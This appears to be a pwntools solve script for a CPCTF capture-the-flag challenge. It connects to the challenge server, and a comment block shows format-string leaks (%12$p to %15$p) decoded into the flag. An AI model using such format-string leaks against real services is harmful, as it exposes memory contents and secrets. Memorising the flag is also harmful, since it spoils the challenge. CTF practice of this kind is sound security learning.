from pwn import *

sock = remote("flag_guardian.web.cpctf.space", 30007)

leak = int("0x7d3374696e6966", 16)

payload = flat(p64(leak))

sock.sendlineafter(b"Do you want to see the flag? (yes/no) ", payload)

print(sock.recvall().decode())

sock.close()

"""
%12$p 0x72707b4654435043 CPCTF{pr
%13$p 0x5730705f66746e69 intf_p0W
%14$p 0x6e315f73315f7233 3r_1s_1n
%15$p 0x7d3374696e6966   finit3}

Flag: CPCTF{printf_p0W3r_1s_1nfinit3}
"""
